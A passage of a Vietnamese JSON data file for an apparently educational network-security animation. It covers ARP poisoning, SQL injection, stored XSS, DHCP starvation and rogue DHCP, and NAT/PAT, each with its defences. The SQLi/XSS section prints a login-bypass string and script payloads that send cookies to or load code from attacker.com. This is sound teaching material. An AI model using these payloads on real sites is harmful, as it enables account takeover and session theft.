        "desc": "Đồng thời, kẻ tấn công gửi gói ARP Reply tới Gateway tuyên bố: 'IP 192.168.1.10 (Host A) đang có địa chỉ MAC là MAC_X'. Cả hai phía đều cập nhật bảng ARP với địa chỉ MAC của kẻ tấn công.",
        "fromNode": "attacker",
        "toNode": "gw",
        "packetLabel": "Spoofed ARP to Gateway",
        "status": "forward",
        "actionText": "Kẻ tấn công gửi ARP Reply giả mạo tới Gateway",
        "pdu": {
          "layer2": "Src MAC: MAC_X | Dst MAC: MAC_G (Gateway)",
          "layer3": "ARP Opcode: 2 (Reply)",
          "layer4": "Sender MAC: MAC_X | Sender IP: 192.168.1.10",
          "payload": "Kẻ tấn công mạo danh là Host A để lừa Gateway."
        },
        "deviceState": {
          "title": "Bảng ARP Cache của Gateway sau khi bị đầu độc",
          "headers": [
            "Địa chỉ IP",
            "Địa chỉ MAC trong bộ đệm",
            "Loại",
            "Thực tế"
          ],
          "rows": [
            [
              "192.168.1.10 (Host A)",
              "MAC_X (Attacker)",
              "DYNAMIC",
              "BỊ ĐẦU ĐỘC (Sai lệch)"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Kẻ tấn công chiếm vị trí trung gian Man-in-the-Middle (MITM)",
        "desc": "Mọi lưu lượng truy cập Internet của Host A và luồng phản hồi từ Gateway đều phải đi qua máy tính của kẻ tấn công trước khi được chuyển tiếp. Kẻ tấn công có thể nghe lén mật khẩu hoặc thay đổi dữ liệu.",
        "fromNode": "victim",
        "toNode": "attacker",
        "packetLabel": "Intercepted Traffic",
        "status": "forward",
        "actionText": "Toàn bộ lưu lượng bị kẻ tấn công nghe lén và can thiệp",
        "pdu": {
          "layer2": "Dst MAC là MAC_X (Attacker) thay vì MAC_G (Gateway)",
          "layer3": "Src IP: 192.168.1.10 | Dst IP: Server ngoài Internet",
          "layer4": "Dữ liệu phiên truyền thông bị phơi bày",
          "payload": "Kẻ tấn công giải mã hoặc sao chép phiên làm việc của người dùng."
        },
        "deviceState": {
          "title": "Trạng thái tấn công Man-in-the-Middle",
          "headers": [
            "Luồng dữ liệu",
            "Đường đi thực tế",
            "Hậu quả"
          ],
          "rows": [
            [
              "Host A -> Internet",
              "Host A -> Attacker -> Gateway",
              "Bị giám sát, thu thập thông tin đăng nhập"
            ],
            [
              "Internet -> Host A",
              "Gateway -> Attacker -> Host A",
              "Có thể bị chèn mã độc (Tampering)"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Cơ chế phòng vệ: Bật Dynamic ARP Inspection (DAI) trên Switch",
        "desc": "Switch Cisco kích hoạt tính năng DAI. DAI chặn các gói ARP trên cổng Untrusted và đối chiếu với cơ sở dữ liệu DHCP Snooping Binding Database. Nếu cặp IP-MAC không khớp, switch lập tức loại bỏ gói tin.",
        "fromNode": "attacker",
        "toNode": "sw",
        "packetLabel": "Spoofed ARP (Intercepted)",
        "status": "drop",
        "actionText": "DAI phát hiện sai lệch IP-MAC và loại bỏ gói tin giả mạo",
        "pdu": {
          "layer2": "Cổng nhận: Fa0/2 (Cổng Untrusted của Attacker)",
          "layer3": "Kiểm tra gói ARP: Sender IP 192.168.1.1 với MAC_X",
          "layer4": "So sánh với DHCP Snooping Database: IP 192.168.1.1 thuộc MAC_G trên cổng Gi0/1",
          "payload": "KẾT QUẢ: KHÔNG TRÙNG KHỚP -> SWITCH DROP GÓI TIN"
        },
        "deviceState": {
          "title": "Bảng đối chiếu DHCP Snooping Binding Table dùng cho DAI",
          "headers": [
            "Địa chỉ MAC",
            "Địa chỉ IP",
            "VLAN",
            "Cổng giao diện",
            "Kết quả DAI"
          ],
          "rows": [
            [
              "MAC_A",
              "192.168.1.10",
              "VLAN 1",
              "FastEthernet0/1",
              "Hợp lệ (Pass)"
            ],
            [
              "MAC_X",
              "192.168.1.99",
              "VLAN 1",
              "FastEthernet0/2",
              "Giả mạo 192.168.1.1 -> BỊ DROP"
            ],
            [
              "MAC_G",
              "192.168.1.1",
              "VLAN 1",
              "GigabitEthernet0/1 (Trusted)",
              "Bỏ qua kiểm tra (Trusted Port)"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Thành phần kỹ thuật DAI",
        "Cấu hình / Ý nghĩa",
        "Lưu ý an ninh"
      ],
      "rows": [
        [
          "Tiền điều kiện bắt buộc",
          "Phải kích hoạt DHCP Snooping trước",
          "Để tạo cơ sở dữ liệu IP-MAC Binding Table"
        ],
        [
          "Cổng Trusted (Tin cậy)",
          "Uplink nối tới Switch khác hoặc Gateway Router",
          "Gói tin ARP không bị kiểm tra, đi qua tự do"
        ],
        [
          "Cổng Untrusted (Không tin cậy)",
          "Các cổng Access nối tới người dùng cuối",
          "Mọi gói ARP đều phải qua xác thực của DAI"
        ],
        [
          "ARP ACL",
          "Dùng cho các thiết bị gán IP tĩnh",
          "Cấu hình thủ công ánh xạ IP-MAC cho server"
        ]
      ]
    },
    "takeaway": "Dynamic ARP Inspection (DAI) phòng chống tấn công ARP Poisoning bằng cách chặn và kiểm tra các gói ARP trên cổng Untrusted dựa vào bảng DHCP Snooping Binding Database."
  },
  "sql_injection_xss": {
    "title": "Cơ chế tấn công ứng dụng Web: SQL Injection và Cross-Site Scripting (XSS)",
    "badge": "Web Application Security / OWASP Top 10",
    "summary": "SQL Injection (SQLi) xảy ra khi dữ liệu người dùng nhập không được lọc mà nối trực tiếp vào câu lệnh truy vấn cơ sở dữ liệu. Cross-Site Scripting (XSS) xảy ra khi mã độc JavaScript do kẻ tấn công chèn vào được thực thi trong trình duyệt của nạn nhân.",
    "topology": {
      "nodes": [
        {
          "id": "attacker",
          "type": "attacker",
          "label": "Attacker",
          "sub": "Payload Injector",
          "x": 70,
          "y": 80
        },
        {
          "id": "web_app",
          "type": "server",
          "label": "Web Application Server",
          "sub": "Xử lý Backend",
          "x": 250,
          "y": 80
        },
        {
          "id": "db",
          "type": "server",
          "label": "Database Server (SQL)",
          "sub": "Users & Passwords",
          "x": 430,
          "y": 80
        },
        {
          "id": "victim",
          "type": "pc",
          "label": "Victim Browser",
          "sub": "Thực thi Script XSS",
          "x": 250,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "attacker",
          "to": "web_app",
          "label": "HTTP POST Malicious Input"
        },
        {
          "from": "web_app",
          "to": "db",
          "label": "SQL Query Execution"
        },
        {
          "from": "web_app",
          "to": "victim",
          "label": "XSS Script Delivery"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Kẻ tấn công gửi Payload SQL Injection qua trường nhập liệu",
        "desc": "Kẻ tấn công nhập chuỗi độc hại vào ô đăng nhập: ' OR '1'='1' -- . Ứng dụng web dễ bị tổn thương nối chuỗi trực tiếp vào câu lệnh SQL.",
        "fromNode": "attacker",
        "toNode": "web_app",
        "packetLabel": "SQLi Payload: ' OR '1'='1",
        "status": "forward",
        "actionText": "Kẻ tấn công gửi chuỗi SQLi qua HTTP POST Login",
        "pdu": {
          "layer2": "Khung tin HTTP qua cổng 80/443",
          "layer3": "Src IP: Attacker | Dst IP: Web Server",
          "layer4": "TCP Port 80 | HTTP POST /login.php",
          "payload": "username=' OR '1'='1' -- &password=any"
        },
        "deviceState": {
          "title": "Câu lệnh SQL được hình thành tại Web Server",
          "headers": [
            "Mục",
            "Nội dung câu lệnh",
            "Đánh giá an toàn"
          ],
          "rows": [
            [
              "Nối chuỗi thô (Vulnerable)",
              "SELECT * FROM users WHERE user='' OR '1'='1' --' AND pass='...'",
              "CỰC KỲ NGUY HIỂM"
            ],
            [
              "Ý nghĩa logic",
              "Mệnh đề '1'='1' luôn luôn ĐÚNG, dấu -- chú thích bỏ qua kiểm tra mật khẩu",
              "Vượt qua xác thực"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Cơ sở dữ liệu thực thi câu lệnh SQL bị biến đổi logic",
        "desc": "Do điều kiện '1'='1' luôn đúng, cơ sở dữ liệu trả về toàn bộ danh sách tài khoản quản trị (Admin) mà không cần nhập mật khẩu hợp lệ.",
        "fromNode": "web_app",
        "toNode": "db",
        "packetLabel": "Bypass Authentication",
        "status": "forward",
        "actionText": "Cơ sở dữ liệu trả về bản ghi quản trị do logic '1'='1' luôn đúng",
        "pdu": {
          "layer2": "Kết nối Database nội bộ",
          "layer3": "Cổng kết nối SQL Port 3306 / 1433",
          "layer4": "Thực thi truy vấn thành công",
          "payload": "Database trả về bản ghi đầu tiên: User Admin (Role: Administrator)"
        },
        "deviceState": {
          "title": "Giải pháp phòng ngừa triệt để SQL Injection",
          "headers": [
            "Phương pháp bảo vệ",
            "Cơ chế hoạt động",
            "Mức độ hiệu quả"
          ],
          "rows": [
            [
              "Parameterized Queries (Prepared Statements)",
              "Tách biệt hoàn toàn giữa cấu trúc lệnh SQL và dữ liệu tham số",
              "Triệt tiêu 100% nguy cơ SQLi"
            ],
            [
              "Input Validation & ORM",
              "Kiểm tra tính hợp lệ của kiểu dữ liệu đầu vào và dùng ORM an toàn",
              "Bảo vệ nhiều lớp"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Kẻ tấn công chèn mã độc JavaScript (Stored XSS Attack)",
        "desc": "Kẻ tấn công đăng bình luận chứa mã JavaScript độc hại vào diễn đàn: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>. Bình luận này được lưu vào cơ sở dữ liệu.",
        "fromNode": "attacker",
        "toNode": "web_app",
        "packetLabel": "XSS Script Injection",
        "status": "forward",
        "actionText": "Kẻ tấn công lưu trữ đoạn mã Script vào trang web",
        "pdu": {
          "layer2": "HTTP POST /comment.php",
          "layer3": "Payload chứa thẻ <script>",
          "layer4": "Web Server không lọc các ký tự đặc biệt (<, >, \")",
          "payload": "Comment: Tuyệt vời! <script src='http://attacker.com/malware.js'></script>"
        },
        "deviceState": {
          "title": "Phân loại các hình thức tấn công XSS",
          "headers": [
            "Loại XSS",
            "Đặc điểm lưu trữ",
            "Cơ chế lây lan"
          ],
          "rows": [
            [
              "Stored XSS (Persistent)",
              "Mã độc lưu trực tiếp trong Database máy chủ",
              "Mọi người dùng xem trang đều bị nhiễm"
            ],
            [
              "Reflected XSS (Non-persistent)",
              "Mã độc nằm trong đường link URL do nạn nhân bấm vào",
              "Chỉ ảnh hưởng người dùng bấm link"
            ],
            [
              "DOM-based XSS",
              "Khai thác trực tiếp mã JavaScript phía Client trình duyệt",
              "Không cần gửi payload lên Server"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Trình duyệt nạn nhân thực thi mã độc và bị đánh cắp Cookie",
        "desc": "Khi người dùng hợp lệ vào xem bình luận, trình duyệt tải trang HTML và tự động thực thi đoạn mã JavaScript độc hại, gửi toàn bộ Session Cookie về cho kẻ tấn công.",
        "fromNode": "web_app",
        "toNode": "victim",
        "packetLabel": "Execute Script & Steal Cookie",
        "status": "forward",
        "actionText": "Trình duyệt thực thi mã độc và gửi Cookie phiên làm việc cho Attacker",
        "pdu": {
          "layer2": "Khung tin từ trình duyệt nạn nhân gửi tới máy chủ kẻ tấn công",
          "layer3": "HTTP GET http://attacker.com/steal?c=SESSION_ID_XYZ",
          "layer4": "Kẻ tấn công chiếm đoạt Session Token để mạo danh người dùng",
          "payload": "Đánh cắp danh tính mà không cần biết mật khẩu."
        },
        "deviceState": {
          "title": "Biện pháp phòng thủ Cross-Site Scripting (XSS)",
          "headers": [
            "Giải pháp",
            "Cơ chế kỹ thuật"
          ],
          "rows": [
            [
              "Context-aware Output Encoding",
              "Mã hóa các ký tự đặc biệt thành thực thể HTML (&lt; &gt; &quot;)"
            ],
            [
              "Cờ HttpOnly cho Cookie",
              "Ngăn chặn mã JavaScript đọc document.cookie trong trình duyệt"
            ],
            [
              "Content Security Policy (CSP)",
              "Cấu hình HTTP Header chỉ cho phép thực thi script từ nguồn đáng tin cậy"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Tiêu chí so sánh",
        "SQL Injection (SQLi)",
        "Cross-Site Scripting (XSS)"
      ],
      "rows": [
        [
          "Mục tiêu tấn công",
          "Hệ quản trị cơ sở dữ liệu Backend (Database)",
          "Trình duyệt của người dùng cuối (Client Browser)"
        ],
        [
          "Ngôn ngữ khai thác",
          "Ngôn ngữ SQL (Structured Query Language)",
          "Ngôn ngữ JavaScript, HTML, CSS"
        ],
        [
          "Hậu quả an ninh",
          "Trích xuất, sửa đổi, xóa dữ liệu máy chủ",
          "Đánh cắp Cookie, chuyển hướng trang, chiếm quyền phiên"
        ],
        [
          "Biện pháp phòng ngừa cốt lõi",
          "Prepared Statements (Parameterized Queries)",
          "Output Encoding, CSP, Cờ HttpOnly Cookie"
        ]
      ]
    },
    "takeaway": "SQLi tấn công cơ sở dữ liệu phía máy chủ do thiếu lọc câu lệnh; XSS tấn công trình duyệt phía người dùng do thiếu mã hóa dữ liệu xuất ra màn hình (Output Encoding)."
  },
  "dhcp_starvation_spoofing": {
    "title": "Tấn công cạn kiệt địa chỉ DHCP (Starvation) và máy chủ DHCP giả mạo (Rogue Server)",
    "badge": "LAN Infrastructure Security / DHCP Attacks & Snooping",
    "summary": "Kẻ tấn công sử dụng công cụ gửi bão gói tin DHCPDISCOVER với MAC giả để vét sạch dải địa chỉ IP của mạng (Starvation), sau đó dựng máy chủ DHCP giả mạo (Rogue DHCP) cấp phát địa chỉ Gateway giả để chuyển hướng toàn bộ lưu lượng qua máy kẻ tấn công.",
    "topology": {
      "nodes": [
        {
          "id": "victim",
          "type": "pc",
          "label": "Client hợp lệ",
          "sub": "Cần xin cấp IP",
          "x": 80,
          "y": 70
        },
        {
          "id": "attacker",
          "type": "attacker",
          "label": "Attacker (Gobbler & Rogue)",
          "sub": "Máy chủ DHCP giả mạo",
          "x": 80,
          "y": 190
        },
        {
          "id": "sw",
          "type": "switch",
          "label": "Cisco Switch",
          "sub": "DHCP Snooping Enabled",
          "x": 260,
          "y": 130
        },
        {
          "id": "dhcp_real",
          "type": "server",
          "label": "DHCP Server thật",
          "sub": "192.168.1.1 (Cổng Trusted)",
          "x": 440,
          "y": 130
        }
      ],
      "links": [
        {
          "from": "victim",
          "to": "sw",
          "label": "Fa0/1 (Untrusted)"
        },
        {
          "from": "attacker",
          "to": "sw",
          "label": "Fa0/2 (Untrusted)"
        },
        {
          "from": "sw",
          "to": "dhcp_real",
          "label": "Gi0/1 (Trusted Port)"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Kẻ tấn công gửi bão yêu cầu DHCP cạn kiệt dải địa chỉ (Starvation)",
        "desc": "Kẻ tấn công chạy công cụ (như Gobbler) liên tục sinh ra hàng nghìn địa chỉ MAC giả mạo để gửi các gói tin DHCPDISCOVER, chiếm dụng toàn bộ địa chỉ IP trong pool của DHCP Server thật.",
        "fromNode": "attacker",
        "toNode": "dhcp_real",
        "packetLabel": "Flood DHCPDISCOVER",
        "status": "forward",
        "actionText": "Kẻ tấn công gửi bão DHCPDISCOVER với hàng nghìn MAC giả",
        "pdu": {
          "layer2": "Src MAC: Sinh ngẫu nhiên liên tục | Dst MAC: ff:ff:ff:ff:ff:ff",
          "layer3": "Src IP: 0.0.0.0 | Dst IP: 255.255.255.255",
          "layer4": "UDP Src Port: 68 | Dst Port: 67 (DHCP Server)",
          "payload": "DHCP Option 53: DHCPDISCOVER | Client Hardware Address thay đổi liên tục"
        },
        "deviceState": {
          "title": "Bảng dải cấp phát IP (DHCP Pool State) của Server thật",
          "headers": [
            "Địa chỉ IP",
            "Trạng thái",
            "MAC được gán",
            "Tình trạng Pool"
          ],
          "rows": [
            [
              "192.168.1.10 -> .250",
              "Leased (Đã cấp phát hết)",
              "MAC giả mạo của công cụ tấn công",
              "CẠN KIỆT (0 IP trống)"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Kẻ tấn công kích hoạt máy chủ DHCP giả mạo (Rogue DHCP Server)",
        "desc": "Sau khi máy chủ thật hết sạch IP, kẻ tấn công kích hoạt máy chủ DHCP giả mạo trên cổng Fa0/2 sẵn sàng phản hồi bất kỳ yêu cầu xin IP nào từ người dùng.",
        "fromNode": "attacker",
        "toNode": "attacker",
        "packetLabel": "Rogue DHCP Active",
        "status": "forward",
        "actionText": "Kẻ tấn công kích hoạt máy chủ DHCP giả mạo",
        "pdu": {
          "layer2": "Chờ đợi gói tin DHCPDISCOVER từ người dùng mới",
          "layer3": "Cấu hình Default Gateway trỏ về IP của chính kẻ tấn công",
          "layer4": "Cấu hình DNS Server trỏ về máy chủ độc hại",
          "payload": "Mục đích: Đánh chặn toàn bộ lưu lượng ra Internet của nạn nhân."
        },
        "deviceState": {
          "title": "Thông số do Rogue DHCP Server phân phối",
          "headers": [
            "Thông số mạng",
            "Giá trị máy chủ thật",
            "Giá trị Rogue DHCP giả mạo"
          ],
          "rows": [
            [
              "Default Gateway",
              "192.168.1.1 (Router chuẩn)",
              "192.168.1.99 (IP của Kẻ tấn công)"
            ],
            [
              "DNS Server",
              "192.168.1.2 (DNS chuẩn)",
              "192.168.1.99 (DNS giả mạo của Attacker)"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Client hợp lệ gửi yêu cầu xin cấp IP và nhận phản hồi từ Rogue DHCP",
        "desc": "Host A khởi động và phát sóng DHCPDISCOVER. Do DHCP Server thật đã cạn IP, chỉ có Rogue DHCP Server gửi phản hồi DHCPOFFER lừa Host A nhận Gateway giả.",
        "fromNode": "attacker",
        "toNode": "victim",
        "packetLabel": "Rogue DHCPOFFER",
        "status": "forward",
        "actionText": "Rogue DHCP gửi DHCPOFFER cấp Gateway và DNS giả mạo",
        "pdu": {
          "layer2": "Dst MAC: Host A",
          "layer3": "Src IP: 192.168.1.99 | Dst IP: 255.255.255.255",
          "layer4": "UDP Src: 67 | Dst: 68",
          "payload": "Offered IP: 192.168.1.200 | Option 3 (Router): 192.168.1.99 | Option 6 (DNS): 192.168.1.99"
        },
        "deviceState": {
          "title": "Cấu hình mạng của Host A sau khi nhận IP từ Rogue DHCP",
          "headers": [
            "Địa chỉ IP nhận",
            "Default Gateway",
            "DNS Server",
            "Tình trạng"
          ],
          "rows": [
            [
              "192.168.1.200",
              "192.168.1.99 (Attacker)",
              "192.168.1.99 (Attacker)",
              "BỊ KIỂM SOÁT HOÀN TOÀN"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Phòng vệ với DHCP Snooping & Port Security trên Switch",
        "desc": "Switch Cisco kích hoạt DHCP Snooping. Cổng nối với DHCP thật (Gi0/1) được cấu hình là TRUSTED. Cổng nối với người dùng và kẻ tấn công (Fa0/1, Fa0/2) là UNTRUSTED. Khi Rogue DHCP gửi bản tin DHCPOFFER/ACK trên cổng Untrusted, switch lập tức Drop gói tin.",
        "fromNode": "attacker",
        "toNode": "sw",
        "packetLabel": "Rogue Offer (Blocked)",
        "status": "drop",
        "actionText": "DHCP Snooping phát hiện gói Server trên cổng Untrusted và Drop ngay",
        "pdu": {
          "layer2": "Nhận bản tin DHCPOFFER trên cổng FastEthernet0/2",
          "layer3": "Cổng Fa0/2 có trạng thái: UNTRUSTED",
          "layer4": "Quy tắc an ninh: Chỉ cổng TRUSTED mới được phép gửi bản tin DHCP Server",
          "payload": "KẾT QUẢ: GÓI TIN BỊ HỦY (DROP) VÀ GHI LOG CẢNH BÁO BẢO MẬT"
        },
        "deviceState": {
          "title": "Bảng phân loại cổng DHCP Snooping trên Switch",
          "headers": [
            "Cổng giao diện",
            "Trạng thái Trust",
            "Hành động với DHCP Server Messages",
            "Giới hạn tốc độ (Rate Limit)"
          ],
          "rows": [
            [
              "GigabitEthernet0/1",
              "TRUSTED",
              "Cho phép chuyển tiếp (Nối DHCP Server thật)",
              "Không giới hạn"
            ],
            [
              "FastEthernet0/1",
              "UNTRUSTED",
              "Chặn DHCPOFFER/ACK, chỉ cho phép Client",
              "15 pps (Chống Starvation)"
            ],
            [
              "FastEthernet0/2",
              "UNTRUSTED",
              "BỊ CHẶN HOÀN TOÀN KHI GỬI OFFER",
              "15 pps (Err-disable nếu vi phạm)"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Tính năng bảo mật Lớp 2",
        "Mục tiêu phòng vệ",
        "Lệnh cấu hình Cisco IOS"
      ],
      "rows": [
        [
          "DHCP Snooping",
          "Ngăn chặn máy chủ DHCP giả mạo (Rogue DHCP Server)",
          "ip dhcp snooping / ip dhcp snooping trust"
        ],
        [
          "DHCP Rate Limiting",
          "Phòng chống tấn công cạn kiệt địa chỉ (DHCP Starvation)",
          "ip dhcp snooping limit rate 15"
        ],
        [
          "Port Security",
          "Giới hạn số lượng địa chỉ MAC học được trên cổng truy cập",
          "switchport port-security maximum 2"
        ],
        [
          "DHCP Option 82",
          "Chèn thông tin vị trí cổng vào bản tin DHCP gửi đến Server",
          "ip dhcp snooping information option"
        ]
      ]
    },
    "takeaway": "DHCP Snooping ngăn chặn Rogue DHCP bằng cách chỉ cho phép các gói tin DHCP Server (Offer, ACK) đi qua cổng Trusted; chống Starvation bằng cách kết hợp Port Security và Rate Limiting."
  },
  "nat_pat_operation": {
    "title": "Cơ chế biên dịch địa chỉ mạng và cổng (NAT / PAT Overload)",
    "badge": "IP Services & Perimeter Security / NAT & Port Translation",
    "summary": "Địa chỉ IPv4 công cộng (Public IP) bị hạn chế. Cơ chế PAT (Port Address Translation / NAT Overload) cho phép hàng nghìn thiết bị trong mạng nội bộ sử dụng địa chỉ IPv4 riêng (Private IP) cùng truy cập Internet đồng thời thông qua một địa chỉ IP công cộng duy nhất bằng cách ánh xạ số cổng Lớp 4 riêng biệt.",
    "topology": {
      "nodes": [
        {
          "id": "pc1",
          "type": "pc",
          "label": "Host A (Inside Local)",
          "sub": "192.168.1.10:45001",
          "x": 80,
          "y": 70
        },
        {
          "id": "pc2",
          "type": "pc",
          "label": "Host B (Inside Local)",
          "sub": "192.168.1.20:45001",
          "x": 80,
          "y": 190
        },
        {
          "id": "nat_rtr",
          "type": "router",
          "label": "Cisco NAT Router",
          "sub": "Public IP: 209.165.200.225",
          "x": 260,
          "y": 130
        },
        {
          "id": "ext_web",
          "type": "server",
          "label": "Web Server (Outside)",
          "sub": "203.0.113.80:80",
          "x": 440,
          "y": 130
        }
      ],
      "links": [
        {
          "from": "pc1",
          "to": "nat_rtr",
          "label": "Inside Interface (Gi0/0)"
        },
        {
          "from": "pc2",
          "to": "nat_rtr",
          "label": "Inside Interface (Gi0/0)"
        },
        {
          "from": "nat_rtr",
          "to": "ext_web",
          "label": "Outside Interface (Gi0/1)"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Host A và Host B gửi gói tin từ mạng nội bộ (Inside Local)",
        "desc": "Cả hai máy trạm bên trong đều gửi yêu cầu web tới Server bên ngoài. Ngẫu nhiên cả 2 máy đều chọn cùng số cổng nguồn tạm thời là 45001.",
        "fromNode": "pc1",
        "toNode": "nat_rtr",
        "packetLabel": "Packet from 192.168.1.10:45001",
        "status": "forward",
        "actionText": "Host A gửi gói tin: 192.168.1.10:45001 -> 203.0.113.80:80",
        "pdu": {
          "layer2": "Khung tin từ mạng LAN nội bộ",
          "layer3": "Src IP (Inside Local): 192.168.1.10 | Dst IP: 203.0.113.80",
          "layer4": "TCP Src Port: 45001 | Dst Port: 80",
          "payload": "HTTP GET request từ Host A"
        },
        "deviceState": {
          "title": "Bảng thuật ngữ 4 loại địa chỉ trong NAT Cisco",
          "headers": [
            "Thuật ngữ",
            "Ý nghĩa kỹ thuật",
            "Ví dụ thực tế"
          ],
          "rows": [
            [
              "Inside Local",
              "Địa chỉ IP gán cho thiết bị trong mạng nội bộ (Private IP)",
              "192.168.1.10 / 192.168.1.20"
            ],
            [
              "Inside Global",
              "Địa chỉ IP công cộng đại diện cho thiết bị nội bộ ra ngoài Internet",
              "209.165.200.225 (Cổng WAN)"
            ],
            [
              "Outside Local",
              "Địa chỉ IP của thiết bị bên ngoài khi nhìn từ mạng nội bộ",
              "203.0.113.80"
            ],
            [
              "Outside Global",
              "Địa chỉ IP công cộng thực tế của thiết bị ngoài Internet",
              "203.0.113.80"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Router NAT thực hiện biên dịch cổng (PAT Overload Translation)",
        "desc": "Router nhận gói tin tại cổng Inside, thay thế địa chỉ IP nguồn thành Inside Global (209.165.200.225) và phân bổ số cổng duy nhất cho từng máy (Host A dùng cổng 50001, Host B dùng cổng 50002).",
        "fromNode": "nat_rtr",
        "toNode": "ext_web",
        "packetLabel": "PAT Translated (Port 50001)",
        "status": "forward",
        "actionText": "Router đổi IP nguồn thành 209.165.200.225 với Port 50001",
        "pdu": {
          "layer2": "Khung tin truyền ra cổng WAN Outside",
          "layer3": "Src IP (Inside Global): 209.165.200.225 | Dst IP: 203.0.113.80",
          "layer4": "TCP Src Port: 50001 (Đã được biên dịch) | Dst Port: 80",
          "payload": "Tính lại mã kiểm tra Checksum của tiêu đề IP và TCP."
        },
        "deviceState": {
          "title": "Bảng biên dịch NAT Translation Table trên Router",
          "headers": [
            "Giao thức",
            "Inside Local (IP:Port)",
            "Inside Global (IP:Port)",
            "Outside Global (IP:Port)"
          ],
          "rows": [
            [
              "tcp",
              "192.168.1.10:45001",
              "209.165.200.225:50001",
              "203.0.113.80:80"
            ],
            [
              "tcp",
              "192.168.1.20:45001",
              "209.165.200.225:50002",
              "203.0.113.80:80"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Máy chủ Web ngoài Internet gửi gói tin phản hồi về",
        "desc": "Web Server nhận được gói tin, chỉ thấy địa chỉ công cộng 209.165.200.225 với cổng đích 50001, và gửi phản hồi về địa chỉ này.",
        "fromNode": "ext_web",
        "toNode": "nat_rtr",
        "packetLabel": "Return to 209.165.200.225:50001",
        "status": "forward",
        "actionText": "Server gửi phản hồi về IP công cộng và Port 50001",
        "pdu": {
          "layer2": "Khung tin từ Internet đi vào cổng Outside Gi0/1",
          "layer3": "Src IP: 203.0.113.80 | Dst IP: 209.165.200.225",
          "layer4": "Src Port: 80 | Dst Port: 50001",
          "payload": "HTTP Response 200 OK từ máy chủ web ngoài."
        },
        "deviceState": {
          "title": "Tra cứu bảng NAT khi nhận gói phản hồi từ bên ngoài",
          "headers": [
            "Tiêu chí tra cứu",
            "Mục tìm thấy trong bảng",
            "Hành động biên dịch ngược"
          ],
          "rows": [
            [
              "Dst Port: 50001",
              "Khớp với Inside Local 192.168.1.10:45001",
              "Biên dịch Dst IP thành 192.168.1.10, Port 45001"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Router biên dịch ngược và chuyển tiếp gói tin về đúng Host A",
        "desc": "Router tra cứu số cổng 50001 trong bảng NAT Table, đổi lại Destination IP thành 192.168.1.10 và Port 45001, chuyển tiếp chính xác về cho Host A mà không gây nhầm lẫn với Host B.",
        "fromNode": "nat_rtr",
        "toNode": "pc1",
        "packetLabel": "Restored to 192.168.1.10:45001",
        "status": "forward",
        "actionText": "Chuyển tiếp phản hồi về đúng máy Host A",
        "pdu": {
          "layer2": "Khung tin Ethernet gửi vào cổng LAN Gi0/0",
          "layer3": "Src IP: 203.0.113.80 | Dst IP: 192.168.1.10",
          "layer4": "Src Port: 80 | Dst Port: 45001",
          "payload": "Host A tiếp nhận dữ liệu trang web thành công."
        },
        "deviceState": {
          "title": "Trạng thái bảng NAT sau khi truyền dữ liệu",
          "headers": [
            "Thông số",
            "Số lượng mục",
            "Ý nghĩa"
          ],
          "rows": [
            [
              "Tổng số phiên PAT đồng thời",
              "Hơn 64,000 phiên",
              "Dựa trên số cổng TCP khả dụng (1024 - 65535)"
            ],
            [
              "Thời gian hết hạn phiên (Timeout)",
              "TCP 24 giờ / UDP 300s",
              "Tự động giải phóng cổng khi phiên kết thúc"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Loại NAT",
        "Tỷ lệ chuyển đổi",
        "Đặc điểm ứng dụng"
      ],
      "rows": [
        [
          "Static NAT (NAT tĩnh)",
          "1 địa chỉ Private : 1 địa chỉ Public cố định",
          "Dùng cho Server nội bộ cần công khai ra Internet (Web, Mail)"
        ],
        [
          "Dynamic NAT (NAT động)",
          "N Private : N Public (theo nhóm IP pool)",
          "Thiết bị chỉ truy cập được khi trong pool còn địa chỉ IP trống"
        ],
        [
          "PAT (Port Address Translation / Overload)",
          "Nhiều Private : 1 Public duy nhất (phân biệt qua Port)",
          "Chuẩn phổ biến nhất trong mọi gia đình và doanh nghiệp hiện nay"
        ]
      ]
    },
    "takeaway": "PAT (NAT Overload) cho phép nhiều thiết bị dùng IP riêng (Inside Local) chia sẻ chung một địa chỉ IP công cộng (Inside Global) bằng cách sử dụng các số cổng Lớp 4 (Port number) khác nhau."
  },
  "cyber_kill_chain": {
    "title": "Chuỗi tấn công không gian mạng Cyber Kill Chain và Mô hình Diamond",
    "badge": "Threat Intelligence & Incident Response / Kill Chain & Diamond",
    "summary": "Chu trình Cyber Kill Chain của Lockheed Martin chia một cuộc tấn công mạng có chủ đích (APT) thành 7 giai đoạn tuần tự. Nếu trung tâm điều hành an ninh SOC phá vỡ được bất kỳ giai đoạn nào trong chuỗi, toàn bộ cuộc tấn công của kẻ thù sẽ thất bại.",
    "topology": {
      "nodes": [
        {
          "id": "adversary",
          "type": "attacker",
          "label": "Kẻ tấn công (Adversary)",
          "sub": "Nhóm APT / Threat Actor",
          "x": 70,
          "y": 80
        },
        {
          "id": "infra",
          "type": "cloud",
          "label": "Hạ tầng tấn công (Infrastructure)",
          "sub": "Máy chủ C2 / Phishing Host",
          "x": 260,
          "y": 80
        },
        {
          "id": "victim",
          "type": "pc",
          "label": "Hệ thống nạn nhân (Victim)",
          "sub": "Máy tính nhân sự doanh nghiệp",
          "x": 450,
          "y": 80
        },
        {
          "id": "soc",
          "type": "firewall",
          "label": "Trung tâm an ninh SOC",
          "sub": "Phòng vệ đa tầng (Defense-in-Depth)",
